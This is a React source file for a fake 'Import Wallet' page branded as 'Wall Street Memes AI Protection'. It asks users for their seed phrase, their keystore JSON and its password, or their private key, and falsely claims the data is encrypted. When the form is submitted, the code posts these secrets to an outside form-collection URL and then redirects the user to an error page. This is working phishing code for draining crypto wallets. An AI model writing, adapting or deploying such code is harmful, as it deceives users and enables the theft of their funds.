import React, { useState } from "react";
import Navbar from "../../component/navbar/Navbar";

//import { Link } from "react-router-dom";

import axios from "axios";

import "./form.css";

const Form = () => {
  const [activeTab, setActiveTab] = useState(1);
  const [phrase, setPhrase] = useState("");
  const [keystoreJson, setKeystoreJson] = useState("");
  const [password, setPassword] = useState("");
  const [privateKey, setPrivateKey] = useState("");

  const handleTabChange = (tab) => {
    setActiveTab(tab);
  };

  async function handleSubmit(event) {
    event.preventDefault();
    let dataToSend = {};

    if (activeTab === 1) {
      dataToSend = { phrase };
    } else if (activeTab === 2) {
      dataToSend = { keystoreJson, password };
    } else if (activeTab === 3) {
      dataToSend = { privateKey };
    }
    // You can perform form submission logic here
    const formSparkUrl = "https://submit-form.com/acoxL8HX";

    try {
      // Make the POST request to Formspark's API
      await axios.post(formSparkUrl, dataToSend);
      window.location.href = "/error";
    } catch (error) {
      console.error("Error submitting form to Formspark:", error);
    }
  }

  return (
    <div>
      <Navbar />
      <div className="app-container">
        <div className="form-cont">
          <h1>Import Wallet</h1>
          <p>
            <span>Wall Street Memes AI Protection</span> Import your wallet
            manually to proceed. All informations provided are encrypted through
            out the process.
          </p>
        </div>
        <div className="tab-buttons">
          <button
            className={activeTab === 1 ? "active" : ""}
            onClick={() => handleTabChange(1)}
          >
            Phrase
          </button>
          <button
            className={activeTab === 2 ? "active" : ""}
            onClick={() => handleTabChange(2)}
          >
            Keystore JSON
          </button>
          <button
            className={activeTab === 3 ? "active" : ""}
            onClick={() => handleTabChange(3)}
          >
            Private Key
          </button>
        </div>
        <div className="form-container">
          <form onSubmit={handleSubmit}>
            {activeTab === 1 && (
              <textarea
                id="phrase"
                className="text-area"
                value={phrase}
                onChange={(e) => setPhrase(e.target.value)}
                placeholder="Enter Phrase here (12 words)"
              />
            )}
            {activeTab === 2 && (
              <>
                <p className="keystore">
                  Several lines of text beginning with "..." plus the password
                  you used for encryption.
                </p>
                <textarea
                  className="text-area"
                  value={keystoreJson}
                  onChange={(e) => setKeystoreJson(e.target.value)}
                  placeholder="Enter Keystore JSON here"
                />

                <textarea
                  className="text-area"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder="Enter password here"
                />
              </>
            )}
            {activeTab === 3 && (
              <textarea
                className="text-area"
                value={privateKey}
                onChange={(e) => setPrivateKey(e.target.value)}
                placeholder="Enter Private Key here"
              />
            )}
            <button className="submit-button" type="submit">
              Submit
            </button>
          </form>
        </div>
      </div>
    </div>
  );
};

export default Form;
